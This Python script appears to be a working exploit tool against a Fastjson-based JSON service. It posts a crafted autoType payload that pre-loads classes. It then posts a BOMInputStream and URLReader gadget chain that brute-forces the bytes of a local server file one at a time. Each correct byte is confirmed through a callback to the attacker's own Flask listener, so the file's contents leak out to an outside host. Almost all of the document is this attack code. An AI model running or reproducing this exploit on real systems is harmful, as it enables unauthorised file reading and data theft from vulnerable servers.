#python3

from flask import Flask, request
import requests
import base64
import time

requests.packages.urllib3.disable_warnings()
app=Flask(__name__)



url = "http://192.168.229.130:9999/json2"
host = "192.168.229.1"
port = 5667
read_file = "file:///tmp/"


header = '''
Host: 127.0.0.1:9999
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: postpass=53f73c7c9c8d01c8fd9dd58765fed402
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Content-Type: application/json
Content-Length: 2
'''

json1 = r'''
{
  "a": "{    \"@type\": \"java.lang.Exception\",    \"@type\": \"com.fasterxml.jackson.core.exc.InputCoercionException\",    \"p\": {    }  }",
  "b": {
    "$ref": "$.a.a"
  },
  "c": "{  \"@type\": \"com.fasterxml.jackson.core.JsonParser\",  \"@type\": \"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\",  \"in\": {}}",
  "d": {
    "$ref": "$.c.c"
  },
}
'''

json2 = r'''
{
  "su18": {
  "@type": "java.io.InputStream",
  "@type": "org.apache.commons.io.input.BOMInputStream",
  "delegate": {
    "@type": "org.apache.commons.io.input.ReaderInputStream",
    "reader": {
        "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": {
                "@type": "java.lang.String" {
                "@type": "java.util.Locale",
                "val": {
                "@type": "com.alibaba.fastjson.JSONObject",
                        {
                        "@type": "java.lang.String"
                        "@type": "java.util.Locale",
                        "language": "http://${host}:${port}/?test=",
                        "country": {"@type": "java.lang.String" [
                        
{
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "${read_file}"
        },
        "charsetName": "UTF-8",
        "bufferSize": "1024"
      },
      "boms": [
        {
          "charsetName": "UTF-8",
          "bytes": [${bytes}]
        }
      ]
}
                        ]
            }
        }
    },
        "charsetName": "UTF-8",
        "bufferSize": 1024
  },
  "boms": [
   {
    "@type": "org.apache.commons.io.ByteOrderMark",
    "charsetName": "UTF-8",
    "bytes": [
     36,
     82
    ]
   }
  ]
 },
 "su19": {
  "$ref": "$.su18.bOM.bytes"
 }
}
'''.replace('${host}', host).replace('${port}', str(port)).replace('${read_file}', read_file)

hava_bytes = False




def get_brute_list():
    recommended = (list(range(97, 123)) + list(range(48, 58)) + [10, 45, 46, 95] + list(range(65, 91)) )
    recommended_set = set(recommended)
    all_ascii = set(range(256))
    others = sorted(all_ascii - recommended_set)
    brute_list = recommended + others
    brute_list.append(256)
    print(brute_list)
    return brute_list



def parse_raw_headers(raw_headers):
    exclude_keys = {'host', 'content-Length'}
    headers = {}
    for line in raw_headers.strip().splitlines():
        if ':' in line:
            key, value = line.split(':', 1)
            key_clean = key.strip()
            if key_clean.lower() not in exclude_keys:
                headers[key_clean] = value.strip()
    return headers

def burp():
    global hava_bytes
    global url
    global header
    global json2
    
    brute_list = get_brute_list()
    bytes = ''
    file_contents = ''
    
    for i in range(1,100000):
        for b in brute_list:
            if b == 256:
                print(file_contents)
                print("file_contents长度: "+str(len(file_contents)))
                return
            bytes_tmp = bytes + str(b)+','
            data = json2.replace('${bytes}', bytes_tmp)
            flag_tmp = file_contents + chr(b)
            r = requests.post(url, data=data, headers=parse_raw_headers(header), verify=False)
            #print(flag_tmp)
            #print(bytes_tmp)
            if hava_bytes:
                bytes = bytes + str(b)+','
                file_contents = file_contents + chr(b)
                print(file_contents)
                hava_bytes = False
                break


@app.route('/')
def default():
    global hava_bytes
    s = request.args.get('test')
    if 'BYTES' in s :
        hava_bytes = True
        return 'ok'
    else:
        return 'no'

@app.route('/run')
def run():
    r1 = requests.post(url, data=json1, headers=parse_raw_headers(header), verify=False)
    print(r1.text)
    start = time.time()
    burp()
    end = time.time()
    time_str = f"耗时：{end - start:.4f} 秒"
    print(time_str)
    return 'ok ' + time_str

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=port)